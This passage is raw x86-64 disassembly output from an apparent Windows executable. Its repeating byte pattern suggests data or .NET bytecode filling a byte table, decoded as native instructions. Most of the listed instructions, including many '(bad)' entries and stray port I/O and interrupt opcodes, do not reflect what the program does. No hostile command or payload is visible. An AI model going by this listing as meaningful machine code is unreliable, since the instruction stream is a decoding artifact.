   140002f34:	00 00                	add    %al,(%rax)
   140002f36:	00 52 12             	add    %dl,0x12(%rdx)
   140002f39:	04 20                	add    $0x20,%al
   140002f3b:	d1 00                	roll   $1,(%rax)
   140002f3d:	00 00                	add    %al,(%rax)
   140002f3f:	58                   	pop    %rax
   140002f40:	20 dc                	and    %bl,%ah
   140002f42:	00 00                	add    %al,(%rax)
   140002f44:	00 52 12             	add    %dl,0x12(%rdx)
   140002f47:	04 20                	add    $0x20,%al
   140002f49:	d2 00                	rolb   %cl,(%rax)
   140002f4b:	00 00                	add    %al,(%rax)
   140002f4d:	58                   	pop    %rax
   140002f4e:	1f                   	(bad)
   140002f4f:	4e 52                	rex.WRX push %rdx
   140002f51:	12 04 20             	adc    (%rax,%riz,1),%al
   140002f54:	d3 00                	roll   %cl,(%rax)
   140002f56:	00 00                	add    %al,(%rax)
   140002f58:	58                   	pop    %rax
   140002f59:	1f                   	(bad)
   140002f5a:	25 52 12 04 20       	and    $0x20041252,%eax
   140002f5f:	d4                   	(bad)
   140002f60:	00 00                	add    %al,(%rax)
   140002f62:	00 58 20             	add    %bl,0x20(%rax)
   140002f65:	c6 00 00             	movb   $0x0,(%rax)
   140002f68:	00 52 12             	add    %dl,0x12(%rdx)
   140002f6b:	04 20                	add    $0x20,%al
   140002f6d:	d5 00 00 00          	{rex2 0x0} add %al,(%rax)
   140002f71:	58                   	pop    %rax
   140002f72:	1f                   	(bad)
   140002f73:	60                   	(bad)
   140002f74:	52                   	push   %rdx
   140002f75:	12 04 20             	adc    (%rax,%riz,1),%al
   140002f78:	d6                   	udb
   140002f79:	00 00                	add    %al,(%rax)
   140002f7b:	00 58 1f             	add    %bl,0x1f(%rax)
   140002f7e:	63 52 12             	movsxd 0x12(%rdx),%edx
   140002f81:	04 20                	add    $0x20,%al
   140002f83:	d7                   	xlat   (%rbx)
   140002f84:	00 00                	add    %al,(%rax)
   140002f86:	00 58 1f             	add    %bl,0x1f(%rax)
   140002f89:	39 52 12             	cmp    %edx,0x12(%rdx)
   140002f8c:	04 20                	add    $0x20,%al
   140002f8e:	d8 00                	fadds  (%rax)
   140002f90:	00 00                	add    %al,(%rax)
   140002f92:	58                   	pop    %rax
   140002f93:	1f                   	(bad)
   140002f94:	5b                   	pop    %rbx
   140002f95:	52                   	push   %rdx
   140002f96:	12 04 20             	adc    (%rax,%riz,1),%al
   140002f99:	d9 00                	flds   (%rax)
   140002f9b:	00 00                	add    %al,(%rax)
   140002f9d:	58                   	pop    %rax
   140002f9e:	20 bc 00 00 00 52 12 	and    %bh,0x12520000(%rax,%rax,1)
   140002fa5:	04 20                	add    $0x20,%al
   140002fa7:	da 00                	fiaddl (%rax)
   140002fa9:	00 00                	add    %al,(%rax)
   140002fab:	58                   	pop    %rax
   140002fac:	1f                   	(bad)
   140002fad:	77 52                	ja     0x140003001
   140002faf:	12 04 20             	adc    (%rax,%riz,1),%al
   140002fb2:	db 00                	fildl  (%rax)
   140002fb4:	00 00                	add    %al,(%rax)
   140002fb6:	58                   	pop    %rax
   140002fb7:	1f                   	(bad)
   140002fb8:	38 52 12             	cmp    %dl,0x12(%rdx)
   140002fbb:	04 20                	add    $0x20,%al
   140002fbd:	dc 00                	faddl  (%rax)
   140002fbf:	00 00                	add    %al,(%rax)
   140002fc1:	58                   	pop    %rax
   140002fc2:	20 d9                	and    %bl,%cl
   140002fc4:	00 00                	add    %al,(%rax)
   140002fc6:	00 52 12             	add    %dl,0x12(%rdx)
   140002fc9:	04 20                	add    $0x20,%al
   140002fcb:	dd 00                	fldl   (%rax)
   140002fcd:	00 00                	add    %al,(%rax)
   140002fcf:	58                   	pop    %rax
   140002fd0:	20 b1 00 00 00 52    	and    %dh,0x52000000(%rcx)
   140002fd6:	12 04 20             	adc    (%rax,%riz,1),%al
   140002fd9:	de 00                	fiadds (%rax)
   140002fdb:	00 00                	add    %al,(%rax)
   140002fdd:	58                   	pop    %rax
   140002fde:	20 82 00 00 00 52    	and    %al,0x52000000(%rdx)
   140002fe4:	12 04 20             	adc    (%rax,%riz,1),%al
   140002fe7:	df 00                	filds  (%rax)
   140002fe9:	00 00                	add    %al,(%rax)
   140002feb:	58                   	pop    %rax
   140002fec:	20 da                	and    %bl,%dl
   140002fee:	00 00                	add    %al,(%rax)
   140002ff0:	00 52 12             	add    %dl,0x12(%rdx)
   140002ff3:	04 20                	add    $0x20,%al
   140002ff5:	e0 00                	loopne 0x140002ff7
   140002ff7:	00 00                	add    %al,(%rax)
   140002ff9:	58                   	pop    %rax
   140002ffa:	20 98 00 00 00 52    	and    %bl,0x52000000(%rax)
   140003000:	12 04 20             	adc    (%rax,%riz,1),%al
   140003003:	e1 00                	loope  0x140003005
   140003005:	00 00                	add    %al,(%rax)
   140003007:	58                   	pop    %rax
   140003008:	20 c2                	and    %al,%dl
   14000300a:	00 00                	add    %al,(%rax)
   14000300c:	00 52 12             	add    %dl,0x12(%rdx)
   14000300f:	04 20                	add    $0x20,%al
   140003011:	e2 00                	loop   0x140003013
   140003013:	00 00                	add    %al,(%rax)
   140003015:	58                   	pop    %rax
   140003016:	1f                   	(bad)
   140003017:	33 52 12             	xor    0x12(%rdx),%edx
   14000301a:	04 20                	add    $0x20,%al
   14000301c:	e3 00                	jrcxz  0x14000301e
   14000301e:	00 00                	add    %al,(%rax)
   140003020:	58                   	pop    %rax
   140003021:	1f                   	(bad)
   140003022:	3d 52 12 04 20       	cmp    $0x20041252,%eax
   140003027:	e4 00                	in     $0x0,%al
   140003029:	00 00                	add    %al,(%rax)
   14000302b:	58                   	pop    %rax
   14000302c:	1f                   	(bad)
   14000302d:	2a 52 12             	sub    0x12(%rdx),%dl
   140003030:	04 20                	add    $0x20,%al
   140003032:	e5 00                	in     $0x0,%eax
   140003034:	00 00                	add    %al,(%rax)
   140003036:	58                   	pop    %rax
   140003037:	1f                   	(bad)
   140003038:	22 52 12             	and    0x12(%rdx),%dl
   14000303b:	04 20                	add    $0x20,%al
   14000303d:	e6 00                	out    %al,$0x0
   14000303f:	00 00                	add    %al,(%rax)
   140003041:	58                   	pop    %rax
   140003042:	1f                   	(bad)
   140003043:	19 52 12             	sbb    %edx,0x12(%rdx)
   140003046:	04 20                	add    $0x20,%al
   140003048:	e7 00                	out    %eax,$0x0
   14000304a:	00 00                	add    %al,(%rax)
   14000304c:	58                   	pop    %rax
   14000304d:	1f                   	(bad)
   14000304e:	18 52 12             	sbb    %dl,0x12(%rdx)
   140003051:	04 20                	add    $0x20,%al
   140003053:	e8 00 00 00 58       	call   0x198003058
   140003058:	20 e4                	and    %ah,%ah
   14000305a:	00 00                	add    %al,(%rax)
   14000305c:	00 52 12             	add    %dl,0x12(%rdx)
   14000305f:	04 20                	add    $0x20,%al
   140003061:	e9 00 00 00 58       	jmp    0x198003066
   140003066:	20 d6                	and    %dl,%dh
   140003068:	00 00                	add    %al,(%rax)
   14000306a:	00 52 12             	add    %dl,0x12(%rdx)
   14000306d:	04 20                	add    $0x20,%al
   14000306f:	ea                   	(bad)
   140003070:	00 00                	add    %al,(%rax)
   140003072:	00 58 20             	add    %bl,0x20(%rax)
   140003075:	a1 00 00 00 52 12 04 	movabs 0xeb20041252000000,%eax
   14000307c:	20 eb 
   14000307e:	00 00                	add    %al,(%rax)
   140003080:	00 58 20             	add    %bl,0x20(%rax)
   140003083:	b0 00                	mov    $0x0,%al
   140003085:	00 00                	add    %al,(%rax)
   140003087:	52                   	push   %rdx
   140003088:	12 04 20             	adc    (%rax,%riz,1),%al
   14000308b:	ec                   	in     (%dx),%al
   14000308c:	00 00                	add    %al,(%rax)
   14000308e:	00 58 1f             	add    %bl,0x1f(%rax)
   140003091:	23 52 12             	and    0x12(%rdx),%edx
   140003094:	04 20                	add    $0x20,%al
   140003096:	ed                   	in     (%dx),%eax
   140003097:	00 00                	add    %al,(%rax)
   140003099:	00 58 1f             	add    %bl,0x1f(%rax)
   14000309c:	34 52                	xor    $0x52,%al
   14000309e:	12 04 20             	adc    (%rax,%riz,1),%al
   1400030a1:	ee                   	out    %al,(%dx)
   1400030a2:	00 00                	add    %al,(%rax)
   1400030a4:	00 58 1f             	add    %bl,0x1f(%rax)
   1400030a7:	64 52                	fs push %rdx
   1400030a9:	12 04 20             	adc    (%rax,%riz,1),%al
   1400030ac:	ef                   	out    %eax,(%dx)
   1400030ad:	00 00                	add    %al,(%rax)
   1400030af:	00 58 1f             	add    %bl,0x1f(%rax)
   1400030b2:	40 52                	rex push %rdx
   1400030b4:	12 04 20             	adc    (%rax,%riz,1),%al
   1400030b7:	f0 00 00             	lock add %al,(%rax)
   1400030ba:	00 58 1f             	add    %bl,0x1f(%rax)
   1400030bd:	6c                   	insb   (%dx),(%rdi)
   1400030be:	52                   	push   %rdx
   1400030bf:	12 04 20             	adc    (%rax,%riz,1),%al
   1400030c2:	f1                   	int1
   1400030c3:	00 00                	add    %al,(%rax)
   1400030c5:	00 58 20             	add    %bl,0x20(%rax)
   1400030c8:	90                   	nop
   1400030c9:	00 00                	add    %al,(%rax)
   1400030cb:	00 52 12             	add    %dl,0x12(%rdx)
   1400030ce:	04 20                	add    $0x20,%al
   1400030d0:	f2 00 00             	repnz add %al,(%rax)
   1400030d3:	00 58 20             	add    %bl,0x20(%rax)
   1400030d6:	c8 00 00 00          	enter  $0x0,$0x0
   1400030da:	52                   	push   %rdx
   1400030db:	12 04 20             	adc    (%rax,%riz,1),%al
   1400030de:	f3 00 00             	repz add %al,(%rax)
   1400030e1:	00 58 1f             	add    %bl,0x1f(%rax)
   1400030e4:	7e 52                	jle    0x140003138
   1400030e6:	12 04 20             	adc    (%rax,%riz,1),%al
   1400030e9:	f4                   	hlt
   1400030ea:	00 00                	add    %al,(%rax)
   1400030ec:	00 58 1f             	add    %bl,0x1f(%rax)
   1400030ef:	39 52 12             	cmp    %edx,0x12(%rdx)
   1400030f2:	04 20                	add    $0x20,%al
   1400030f4:	f5                   	cmc
   1400030f5:	00 00                	add    %al,(%rax)
   1400030f7:	00 58 1f             	add    %bl,0x1f(%rax)
   1400030fa:	28 52 12             	sub    %dl,0x12(%rdx)
   1400030fd:	04 20                	add    $0x20,%al
   1400030ff:	f6 00 00             	testb  $0x0,(%rax)
   140003102:	00 58 20             	add    %bl,0x20(%rax)
   140003105:	9f                   	lahf
   140003106:	00 00                	add    %al,(%rax)
   140003108:	00 52 12             	add    %dl,0x12(%rdx)
   14000310b:	04 20                	add    $0x20,%al
   14000310d:	f7 00 00 00 58 20    	testl  $0x20580000,(%rax)
   140003113:	d6                   	udb
   140003114:	00 00                	add    %al,(%rax)
   140003116:	00 52 12             	add    %dl,0x12(%rdx)
   140003119:	04 20                	add    $0x20,%al
   14000311b:	f8                   	clc
   14000311c:	00 00                	add    %al,(%rax)
   14000311e:	00 58 1f             	add    %bl,0x1f(%rax)
   140003121:	54                   	push   %rsp
   140003122:	52                   	push   %rdx
   140003123:	12 04 20             	adc    (%rax,%riz,1),%al
   140003126:	f9                   	stc
   140003127:	00 00                	add    %al,(%rax)
   140003129:	00 58 1f             	add    %bl,0x1f(%rax)
   14000312c:	3e 52                	ds push %rdx
   14000312e:	12 04 20             	adc    (%rax,%riz,1),%al
   140003131:	fa                   	cli
   140003132:	00 00                	add    %al,(%rax)
   140003134:	00 58 1f             	add    %bl,0x1f(%rax)
   140003137:	5a                   	pop    %rdx
   140003138:	52                   	push   %rdx
   140003139:	12 04 20             	adc    (%rax,%riz,1),%al
   14000313c:	fb                   	sti
   14000313d:	00 00                	add    %al,(%rax)
   14000313f:	00 58 20             	add    %bl,0x20(%rax)
   140003142:	e4 00                	in     $0x0,%al
   140003144:	00 00                	add    %al,(%rax)
   140003146:	52                   	push   %rdx
   140003147:	12 04 20             	adc    (%rax,%riz,1),%al
   14000314a:	fc                   	cld
   14000314b:	00 00                	add    %al,(%rax)
   14000314d:	00 58 1f             	add    %bl,0x1f(%rax)
   140003150:	3a 52 12             	cmp    0x12(%rdx),%dl
   140003153:	04 20                	add    $0x20,%al
   140003155:	fd                   	std
   140003156:	00 00                	add    %al,(%rax)
   140003158:	00 58 1f             	add    %bl,0x1f(%rax)
   14000315b:	73 52                	jae    0x1400031af
   14000315d:	12 04 20             	adc    (%rax,%riz,1),%al
   140003160:	fe 00                	incb   (%rax)
   140003162:	00 00                	add    %al,(%rax)
   140003164:	58                   	pop    %rax
   140003165:	20 f0                	and    %dh,%al
   140003167:	00 00                	add    %al,(%rax)
   140003169:	00 52 12             	add    %dl,0x12(%rdx)
   14000316c:	04 20                	add    $0x20,%al
   14000316e:	ff 00                	incl   (%rax)
   140003170:	00 00                	add    %al,(%rax)
   140003172:	58                   	pop    %rax
   140003173:	20 9d 00 00 00 52    	and    %bl,0x52000000(%rbp)
   140003179:	12 04 20             	adc    (%rax,%riz,1),%al
   14000317c:	00 01                	add    %al,(%rcx)
   14000317e:	00 00                	add    %al,(%rax)
   140003180:	58                   	pop    %rax
   140003181:	20 86 00 00 00 52    	and    %al,0x52000000(%rsi)
   140003187:	12 04 20             	adc    (%rax,%riz,1),%al
   14000318a:	01 01                	add    %eax,(%rcx)
   14000318c:	00 00                	add    %al,(%rax)
   14000318e:	58                   	pop    %rax
   14000318f:	1f                   	(bad)
   140003190:	10 52 12             	adc    %dl,0x12(%rdx)
   140003193:	04 20                	add    $0x20,%al
   140003195:	02 01                	add    (%rcx),%al
   140003197:	00 00                	add    %al,(%rax)
   140003199:	58                   	pop    %rax
   14000319a:	20 83 00 00 00 52    	and    %al,0x52000000(%rbx)
   1400031a0:	12 04 20             	adc    (%rax,%riz,1),%al
   1400031a3:	03 01                	add    (%rcx),%eax
   1400031a5:	00 00                	add    %al,(%rax)
   1400031a7:	58                   	pop    %rax
   1400031a8:	1f                   	(bad)
   1400031a9:	53                   	push   %rbx
   1400031aa:	52                   	push   %rdx
   1400031ab:	12 04 20             	adc    (%rax,%riz,1),%al
   1400031ae:	04 01                	add    $0x1,%al
   1400031b0:	00 00                	add    %al,(%rax)
   1400031b2:	58                   	pop    %rax
   1400031b3:	1f                   	(bad)
   1400031b4:	1f                   	(bad)
   1400031b5:	52                   	push   %rdx
   1400031b6:	12 04 20             	adc    (%rax,%riz,1),%al
   1400031b9:	05 01 00 00 58       	add    $0x58000001,%eax
   1400031be:	20 b8 00 00 00 52    	and    %bh,0x52000000(%rax)
   1400031c4:	12 04 20             	adc    (%rax,%riz,1),%al
   1400031c7:	06                   	(bad)
   1400031c8:	01 00                	add    %eax,(%rax)
   1400031ca:	00 58 20             	add    %bl,0x20(%rax)
   1400031cd:	aa                   	stos   %al,(%rdi)
   1400031ce:	00 00                	add    %al,(%rax)
   1400031d0:	00 52 12             	add    %dl,0x12(%rdx)
   1400031d3:	04 20                	add    $0x20,%al
   1400031d5:	07                   	(bad)
   1400031d6:	01 00                	add    %eax,(%rax)
   1400031d8:	00 58 1f             	add    %bl,0x1f(%rax)
   1400031db:	63 52 12             	movsxd 0x12(%rdx),%edx
   1400031de:	04 20                	add    $0x20,%al
   1400031e0:	08 01                	or     %al,(%rcx)
   1400031e2:	00 00                	add    %al,(%rax)
   1400031e4:	58                   	pop    %rax
   1400031e5:	20 ee                	and    %ch,%dh
   1400031e7:	00 00                	add    %al,(%rax)
   1400031e9:	00 52 12             	add    %dl,0x12(%rdx)
   1400031ec:	04 20                	add    $0x20,%al
   1400031ee:	09 01                	or     %eax,(%rcx)
   1400031f0:	00 00                	add    %al,(%rax)
   1400031f2:	58                   	pop    %rax
   1400031f3:	1f                   	(bad)
   1400031f4:	70 52                	jo     0x140003248
   1400031f6:	12 04 20             	adc    (%rax,%riz,1),%al
   1400031f9:	0a 01                	or     (%rcx),%al
   1400031fb:	00 00                	add    %al,(%rax)
   1400031fd:	58                   	pop    %rax
   1400031fe:	1f                   	(bad)
   1400031ff:	40 52                	rex push %rdx
   140003201:	12 04 20             	adc    (%rax,%riz,1),%al
   140003204:	0b 01                	or     (%rcx),%eax
   140003206:	00 00                	add    %al,(%rax)
   140003208:	58                   	pop    %rax
   140003209:	1f                   	(bad)
   14000320a:	7c 52                	jl     0x14000325e
   14000320c:	12 04 20             	adc    (%rax,%riz,1),%al
   14000320f:	0c 01                	or     $0x1,%al
   140003211:	00 00                	add    %al,(%rax)
   140003213:	58                   	pop    %rax
   140003214:	20 bb 00 00 00 52    	and    %bh,0x52000000(%rbx)
   14000321a:	12 04 20             	adc    (%rax,%riz,1),%al
   14000321d:	0d 01 00 00 58       	or     $0x58000001,%eax
   140003222:	20 c0                	and    %al,%al
   140003224:	00 00                	add    %al,(%rax)
   140003226:	00 52 12             	add    %dl,0x12(%rdx)
   140003229:	04 20                	add    $0x20,%al
   14000322b:	0e                   	(bad)
   14000322c:	01 00                	add    %eax,(%rax)
   14000322e:	00 58 20             	add    %bl,0x20(%rax)
   140003231:	a2 00 00 00 52 12 04 	movabs %al,0xf20041252000000
   140003238:	20 0f 
   14000323a:	01 00                	add    %eax,(%rax)
   14000323c:	00 58 1f             	add    %bl,0x1f(%rax)
   14000323f:	35 52 12 04 20       	xor    $0x20041252,%eax
   140003244:	10 01                	adc    %al,(%rcx)
   140003246:	00 00                	add    %al,(%rax)
   140003248:	58                   	pop    %rax
   140003249:	20 fe                	and    %bh,%dh
   14000324b:	00 00                	add    %al,(%rax)
   14000324d:	00 52 12             	add    %dl,0x12(%rdx)
   140003250:	04 20                	add    $0x20,%al
   140003252:	11 01                	adc    %eax,(%rcx)
   140003254:	00 00                	add    %al,(%rax)
   140003256:	58                   	pop    %rax
   140003257:	20 ed                	and    %ch,%ch
   140003259:	00 00                	add    %al,(%rax)
   14000325b:	00 52 12             	add    %dl,0x12(%rdx)
   14000325e:	04 20                	add    $0x20,%al
   140003260:	12 01                	adc    (%rcx),%al
   140003262:	00 00                	add    %al,(%rax)
   140003264:	58                   	pop    %rax
   140003265:	1f                   	(bad)
   140003266:	6b 52 12 04          	imul   $0x4,0x12(%rdx),%edx
   14000326a:	20 13                	and    %dl,(%rbx)
   14000326c:	01 00                	add    %eax,(%rax)
   14000326e:	00 58 1f             	add    %bl,0x1f(%rax)
   140003271:	56                   	push   %rsi
   140003272:	52                   	push   %rdx
   140003273:	12 04 20             	adc    (%rax,%riz,1),%al
   140003276:	14 01                	adc    $0x1,%al
   140003278:	00 00                	add    %al,(%rax)
   14000327a:	58                   	pop    %rax
   14000327b:	1f                   	(bad)
   14000327c:	34 52                	xor    $0x52,%al
   14000327e:	12 04 20             	adc    (%rax,%riz,1),%al
   140003281:	15 01 00 00 58       	adc    $0x58000001,%eax
   140003286:	1f                   	(bad)
   140003287:	25 52 12 04 20       	and    $0x20041252,%eax
   14000328c:	16                   	(bad)
   14000328d:	01 00                	add    %eax,(%rax)
   14000328f:	00 58 1f             	add    %bl,0x1f(%rax)
   140003292:	2d 52 12 04 20       	sub    $0x20041252,%eax
   140003297:	17                   	(bad)
   140003298:	01 00                	add    %eax,(%rax)
   14000329a:	00 58 1f             	add    %bl,0x1f(%rax)
   14000329d:	1b 52 12             	sbb    0x12(%rdx),%edx
   1400032a0:	04 20                	add    $0x20,%al
   1400032a2:	18 01                	sbb    %al,(%rcx)
   1400032a4:	00 00                	add    %al,(%rax)
   1400032a6:	58                   	pop    %rax
   1400032a7:	20 f6                	and    %dh,%dh
   1400032a9:	00 00                	add    %al,(%rax)
   1400032ab:	00 52 12             	add    %dl,0x12(%rdx)
   1400032ae:	04 20                	add    $0x20,%al
   1400032b0:	19 01                	sbb    %eax,(%rcx)
   1400032b2:	00 00                	add    %al,(%rax)
   1400032b4:	58                   	pop    %rax
   1400032b5:	20 b5 00 00 00 52    	and    %dh,0x52000000(%rbp)
   1400032bb:	12 04 20             	adc    (%rax,%riz,1),%al
   1400032be:	1a 01                	sbb    (%rcx),%al
   1400032c0:	00 00                	add    %al,(%rax)
   1400032c2:	58                   	pop    %rax
   1400032c3:	20 b1 00 00 00 52    	and    %dh,0x52000000(%rcx)
   1400032c9:	12 04 20             	adc    (%rax,%riz,1),%al
   1400032cc:	1b 01                	sbb    (%rcx),%eax
   1400032ce:	00 00                	add    %al,(%rax)
   1400032d0:	58                   	pop    %rax
   1400032d1:	20 91 00 00 00 52    	and    %dl,0x52000000(%rcx)
   1400032d7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400032da:	1c 01                	sbb    $0x1,%al
   1400032dc:	00 00                	add    %al,(%rax)
   1400032de:	58                   	pop    %rax
   1400032df:	1f                   	(bad)
   1400032e0:	61                   	(bad)
   1400032e1:	52                   	push   %rdx
   1400032e2:	12 04 20             	adc    (%rax,%riz,1),%al
   1400032e5:	1d 01 00 00 58       	sbb    $0x58000001,%eax
   1400032ea:	20 9c 00 00 00 52 12 	and    %bl,0x12520000(%rax,%rax,1)
   1400032f1:	04 20                	add    $0x20,%al
   1400032f3:	1e                   	(bad)
   1400032f4:	01 00                	add    %eax,(%rax)
   1400032f6:	00 58 20             	add    %bl,0x20(%rax)
   1400032f9:	8f 00                	pop    (%rax)
   1400032fb:	00 00                	add    %al,(%rax)
   1400032fd:	52                   	push   %rdx
   1400032fe:	12 04 20             	adc    (%rax,%riz,1),%al
   140003301:	1f                   	(bad)
   140003302:	01 00                	add    %eax,(%rax)
   140003304:	00 58 1f             	add    %bl,0x1f(%rax)
   140003307:	4e 52                	rex.WRX push %rdx
   140003309:	12 04 20             	adc    (%rax,%riz,1),%al
   14000330c:	20 01                	and    %al,(%rcx)
   14000330e:	00 00                	add    %al,(%rax)
   140003310:	58                   	pop    %rax
   140003311:	1f                   	(bad)
   140003312:	19 52 12             	sbb    %edx,0x12(%rdx)
   140003315:	04 20                	add    $0x20,%al
   140003317:	21 01                	and    %eax,(%rcx)
   140003319:	00 00                	add    %al,(%rax)
   14000331b:	58                   	pop    %rax
   14000331c:	1f                   	(bad)
   14000331d:	65 52                	gs push %rdx
   14000331f:	12 04 20             	adc    (%rax,%riz,1),%al
   140003322:	22 01                	and    (%rcx),%al
   140003324:	00 00                	add    %al,(%rax)
   140003326:	58                   	pop    %rax
   140003327:	1f                   	(bad)
   140003328:	58                   	pop    %rax
   140003329:	52                   	push   %rdx
   14000332a:	12 04 20             	adc    (%rax,%riz,1),%al
   14000332d:	23 01                	and    (%rcx),%eax
   14000332f:	00 00                	add    %al,(%rax)
   140003331:	58                   	pop    %rax
   140003332:	1f                   	(bad)
   140003333:	43 52                	rex.XB push %r10
   140003335:	12 04 20             	adc    (%rax,%riz,1),%al
   140003338:	24 01                	and    $0x1,%al
   14000333a:	00 00                	add    %al,(%rax)
   14000333c:	58                   	pop    %rax
   14000333d:	1f                   	(bad)
   14000333e:	32 52 12             	xor    0x12(%rdx),%dl
   140003341:	04 20                	add    $0x20,%al
   140003343:	25 01 00 00 58       	and    $0x58000001,%eax
   140003348:	20 cd                	and    %cl,%ch
   14000334a:	00 00                	add    %al,(%rax)
   14000334c:	00 52 12             	add    %dl,0x12(%rdx)
   14000334f:	04 20                	add    $0x20,%al
   140003351:	26 01 00             	es add %eax,(%rax)
   140003354:	00 58 20             	add    %bl,0x20(%rax)
   140003357:	cc                   	int3
   140003358:	00 00                	add    %al,(%rax)
   14000335a:	00 52 12             	add    %dl,0x12(%rdx)
   14000335d:	04 20                	add    $0x20,%al
   14000335f:	27                   	(bad)
   140003360:	01 00                	add    %eax,(%rax)
   140003362:	00 58 20             	add    %bl,0x20(%rax)
   140003365:	af                   	scas   (%rdi),%eax
   140003366:	00 00                	add    %al,(%rax)
   140003368:	00 52 12             	add    %dl,0x12(%rdx)
   14000336b:	04 20                	add    $0x20,%al
   14000336d:	28 01                	sub    %al,(%rcx)
   14000336f:	00 00                	add    %al,(%rax)
   140003371:	58                   	pop    %rax
   140003372:	1f                   	(bad)
   140003373:	2c 52                	sub    $0x52,%al
   140003375:	12 04 20             	adc    (%rax,%riz,1),%al
   140003378:	29 01                	sub    %eax,(%rcx)
   14000337a:	00 00                	add    %al,(%rax)
   14000337c:	58                   	pop    %rax
   14000337d:	1f                   	(bad)
   14000337e:	6e                   	outsb  (%rsi),(%dx)
   14000337f:	52                   	push   %rdx
   140003380:	12 04 20             	adc    (%rax,%riz,1),%al
   140003383:	2a 01                	sub    (%rcx),%al
   140003385:	00 00                	add    %al,(%rax)
   140003387:	58                   	pop    %rax
   140003388:	20 9c 00 00 00 52 12 	and    %bl,0x12520000(%rax,%rax,1)
   14000338f:	04 20                	add    $0x20,%al
   140003391:	2b 01                	sub    (%rcx),%eax
   140003393:	00 00                	add    %al,(%rax)
   140003395:	58                   	pop    %rax
   140003396:	20 c0                	and    %al,%al
   140003398:	00 00                	add    %al,(%rax)
   14000339a:	00 52 12             	add    %dl,0x12(%rdx)
   14000339d:	04 20                	add    $0x20,%al
   14000339f:	2c 01                	sub    $0x1,%al
   1400033a1:	00 00                	add    %al,(%rax)
   1400033a3:	58                   	pop    %rax
   1400033a4:	1f                   	(bad)
   1400033a5:	6f                   	outsl  (%rsi),(%dx)
   1400033a6:	52                   	push   %rdx
   1400033a7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400033aa:	2d 01 00 00 58       	sub    $0x58000001,%eax
   1400033af:	20 be 00 00 00 52    	and    %bh,0x52000000(%rsi)
   1400033b5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400033b8:	2e 01 00             	cs add %eax,(%rax)
   1400033bb:	00 58 20             	add    %bl,0x20(%rax)
   1400033be:	ce                   	(bad)
   1400033bf:	00 00                	add    %al,(%rax)
   1400033c1:	00 52 12             	add    %dl,0x12(%rdx)
   1400033c4:	04 20                	add    $0x20,%al
   1400033c6:	2f                   	(bad)
   1400033c7:	01 00                	add    %eax,(%rax)
   1400033c9:	00 58 1f             	add    %bl,0x1f(%rax)
   1400033cc:	13 52 12             	adc    0x12(%rdx),%edx
   1400033cf:	04 20                	add    $0x20,%al
   1400033d1:	30 01                	xor    %al,(%rcx)
   1400033d3:	00 00                	add    %al,(%rax)
   1400033d5:	58                   	pop    %rax
   1400033d6:	1f                   	(bad)
   1400033d7:	20 52 12             	and    %dl,0x12(%rdx)
   1400033da:	04 20                	add    $0x20,%al
   1400033dc:	31 01                	xor    %eax,(%rcx)
   1400033de:	00 00                	add    %al,(%rax)
   1400033e0:	58                   	pop    %rax
   1400033e1:	20 88 00 00 00 52    	and    %cl,0x52000000(%rax)
   1400033e7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400033ea:	32 01                	xor    (%rcx),%al
   1400033ec:	00 00                	add    %al,(%rax)
   1400033ee:	58                   	pop    %rax
   1400033ef:	20 b9 00 00 00 52    	and    %bh,0x52000000(%rcx)
   1400033f5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400033f8:	33 01                	xor    (%rcx),%eax
   1400033fa:	00 00                	add    %al,(%rax)
   1400033fc:	58                   	pop    %rax
   1400033fd:	20 df                	and    %bl,%bh
   1400033ff:	00 00                	add    %al,(%rax)
   140003401:	00 52 12             	add    %dl,0x12(%rdx)
   140003404:	04 20                	add    $0x20,%al
   140003406:	34 01                	xor    $0x1,%al
   140003408:	00 00                	add    %al,(%rax)
   14000340a:	58                   	pop    %rax
   14000340b:	20 88 00 00 00 52    	and    %cl,0x52000000(%rax)
   140003411:	12 04 20             	adc    (%rax,%riz,1),%al
   140003414:	35 01 00 00 58       	xor    $0x58000001,%eax
   140003419:	20 fe                	and    %bh,%dh
   14000341b:	00 00                	add    %al,(%rax)
   14000341d:	00 52 12             	add    %dl,0x12(%rdx)
   140003420:	04 20                	add    $0x20,%al
   140003422:	36 01 00             	ss add %eax,(%rax)
   140003425:	00 58 1f             	add    %bl,0x1f(%rax)
   140003428:	33 52 12             	xor    0x12(%rdx),%edx
   14000342b:	04 20                	add    $0x20,%al
   14000342d:	37                   	(bad)
   14000342e:	01 00                	add    %eax,(%rax)
   140003430:	00 58 20             	add    %bl,0x20(%rax)
   140003433:	ae                   	scas   (%rdi),%al
   140003434:	00 00                	add    %al,(%rax)
   140003436:	00 52 12             	add    %dl,0x12(%rdx)
   140003439:	04 20                	add    $0x20,%al
   14000343b:	38 01                	cmp    %al,(%rcx)
   14000343d:	00 00                	add    %al,(%rax)
   14000343f:	58                   	pop    %rax
   140003440:	20 f9                	and    %bh,%cl
   140003442:	00 00                	add    %al,(%rax)
   140003444:	00 52 12             	add    %dl,0x12(%rdx)
   140003447:	04 20                	add    $0x20,%al
   140003449:	39 01                	cmp    %eax,(%rcx)
   14000344b:	00 00                	add    %al,(%rax)
   14000344d:	58                   	pop    %rax
   14000344e:	1f                   	(bad)
   14000344f:	69 52 12 04 20 3a 01 	imul   $0x13a2004,0x12(%rdx),%edx
   140003456:	00 00                	add    %al,(%rax)
   140003458:	58                   	pop    %rax
   140003459:	1f                   	(bad)
   14000345a:	12 52 12             	adc    0x12(%rdx),%dl
   14000345d:	04 20                	add    $0x20,%al
   14000345f:	3b 01                	cmp    (%rcx),%eax
   140003461:	00 00                	add    %al,(%rax)
   140003463:	58                   	pop    %rax
   140003464:	20 e5                	and    %ah,%ch
   140003466:	00 00                	add    %al,(%rax)
   140003468:	00 52 12             	add    %dl,0x12(%rdx)
   14000346b:	04 20                	add    $0x20,%al
   14000346d:	3c 01                	cmp    $0x1,%al
   14000346f:	00 00                	add    %al,(%rax)
   140003471:	58                   	pop    %rax
   140003472:	20 a2 00 00 00 52    	and    %ah,0x52000000(%rdx)
   140003478:	12 04 20             	adc    (%rax,%riz,1),%al
   14000347b:	3d 01 00 00 58       	cmp    $0x58000001,%eax
   140003480:	20 90 00 00 00 52    	and    %dl,0x52000000(%rax)
   140003486:	12 04 20             	adc    (%rax,%riz,1),%al
   140003489:	3e 01 00             	ds add %eax,(%rax)
   14000348c:	00 58 20             	add    %bl,0x20(%rax)
   14000348f:	99                   	cltd
   140003490:	00 00                	add    %al,(%rax)
